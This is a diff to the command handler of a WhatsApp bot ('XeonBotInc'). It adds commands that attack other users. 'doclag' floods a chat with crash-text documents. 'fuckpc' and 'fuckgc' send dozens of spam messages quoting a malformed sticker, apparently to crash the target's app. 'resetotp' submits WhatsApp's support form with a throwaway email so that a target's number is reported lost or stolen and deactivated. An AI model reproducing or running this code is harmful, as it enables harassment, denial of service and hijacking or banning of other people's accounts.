@@ -6627,11 +6627,12 @@ let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "
 XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
 }
 break
-case "resetotp": {
+case 'bannumber':{
+	if (!isPrem) return replyprem(mess.premium)
 if (Input) {
 let cekno = await XeonBotInc.onWhatsApp(Input)
 if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
-if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🦄!`)
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
 var targetnya = m.sender.split('@')[0]
 try {
 var axioss = require('axios')
@@ -6681,7 +6682,243 @@ replygcxeon(`Moderate Limit Wait A Moment.`)
 } else replygcxeon('Enter Target Number!')
 }
 break
+case 'doclag':{
+	if (args.length == 0) return replygcxeon(`Amount?`)
+	const amountx = `${encodeURI(q)}`
+const { virtex } = require('./XBug/virtex')
+for (let i = 0; i < amountx; i++) {
+XeonBotInc.sendMessage(m.chat, { document: fs.readFileSync("./XBug/teri_ma_ki_chut_me_mera_garam_lund"), mimetype: 'application/pdf', fileName: `Https://wa.me/settings ${virtex}.${virtex}.${virtex}`, caption: `Https://wa.me/settings\n${virtex}\n${virtex}`}, { quoted: m })
+}
+}
+break
+case 'fuckpc':{
+		if (!isPrem) return replyprem(mess.premium)
+if (Input) {
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
+await replygcxeon(`Bugging in process...`)
+const xeonoh = { 
+key: {
+fromMe: [], 
+participant: "0@s.whatsapp.net",  remoteJid: ""
+},
 
+'message': {
+ "stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 40,
+"width": 40,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "99999999",
+"mediaKeyTimestamp": "16572901099967",
+        'isAnimated': []
+}}}
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+m.reply(`Succes!!`)
+} else replygcxeon('Enter Target Number!')
+}
+break
+case 'fuckgc': {
+const xeonoh = { 
+key: {
+fromMe: [], 
+participant: "0@s.whatsapp.net",  remoteJid: ""
+},
+
+'message': {
+ "stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 40,
+"width": 40,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "99999999",
+"mediaKeyTimestamp": "16572901099967",
+        'isAnimated': []
+}}}
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE @DGXeon ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+replygcxeon(`Succes!!`)
+    }
+    break
+case 'resetotp':{ 
+	if (!isPrem) return replyprem(mess.premium)
+	if (Input) {
+let cekno = await XeonBotInc.onWhatsApp(Input)
+if (cekno.length == 0) return replygcxeon(`The participant is longer registered on WhatsApp`)
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
+var targetnya = m.sender.split('@')[0]
+try {
+   var axioss = require ("axios")
+   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+ let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+ let cookie = ntah.headers["set-cookie"].join("; ")
+ let $ = cheerio.load(ntah.data)
+ let $form = $("form");
+ let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+ let form = new URLSearchParams()
+ form.append("jazoest", $form.find("input[name=jazoest]").val())
+ form.append("lsd", $form.find("input[name=lsd]").val())
+ form.append("step", "submit")
+ form.append("country_selector", "ID")
+ form.append("phone_number", q)
+ form.append("email", email.data[0])
+ form.append("email_confirm", email.data[0])
+ form.append("platform", "ANDROID")
+ form.append("your_message", "Perdido/roubado: desative minha conta")
+ form.append("__user", "0")
+ form.append("__a", "1")
+ form.append("__csr", "")
+ form.append("__req", "8")
+ form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+ form.append("dpr", "1")
+ form.append("__ccg", "UNKNOWN")
+ form.append("__rev", "1006630858")
+ form.append("__comment_req", "0")
+ let res = await axioss({
+   url,
+   method: "POST",
+   data: form,
+   headers: {
+     cookie
+   }
+ })
+replygcxeon(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
+} catch (err) {replygcxeon(`${err}`)}
+} else replygcxeon('Enter Target Number!')
+}
+break
 default:
 
 if (budy.startsWith('<')) {
